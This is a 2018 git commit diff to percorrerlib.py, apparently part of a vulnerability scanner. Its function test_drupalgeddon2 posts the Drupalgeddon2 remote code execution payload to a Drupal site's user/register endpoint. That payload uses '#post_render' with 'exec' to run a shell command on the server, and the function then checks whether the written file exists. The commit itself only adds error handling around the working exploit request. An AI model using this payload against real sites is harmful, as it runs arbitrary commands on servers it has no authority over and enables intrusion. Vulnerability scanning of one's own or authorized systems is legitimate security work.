a3ad54441377b09b3c4b9b81e89bed13f73c17c4
Markinnmn <30961631+Markinnmn@users.noreply.github.com>
2018-11-18 01:57:59 -0200

    Add files via upload

--- percorrerlib.py
+++ percorrerlib.py
@@ -1,7 +1,7 @@
-import re
-import sys
 import requests
 import urllib3
+from requests.exceptions import ConnectionError
+
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -15,12 +15,20 @@ def test_drupalgeddon2(target):
     url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
     payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo hello world | tee hello.txt'}
      
-    r = requests.post(url, data=payload, verify=verify)
-    print(r.status_code)
-    check = requests.get(target + 'hello.txt')
-    print(check.status_code)
-    if check.status_code != 200:
+    try:
+        r = requests.post(url, data=payload, verify=verify)
+    except ConnectionError as e:
+        print(e)
+
+    st = -1
+
+    try:
+        check = requests.get(target + 'hello.txt')
+        st = check.status_code
+    except ConnectionError as e:
+        print(e)
+
+    if st != 200:
         return 0
     else:
         return 1
-    
